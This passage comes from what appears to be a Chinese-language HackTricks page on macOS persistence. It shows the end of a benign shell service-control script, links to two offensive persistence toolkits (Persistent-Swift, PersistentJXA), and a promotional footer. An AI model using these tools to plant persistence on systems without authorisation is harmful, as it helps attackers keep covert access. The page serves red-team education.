return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持久化技术和工具

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
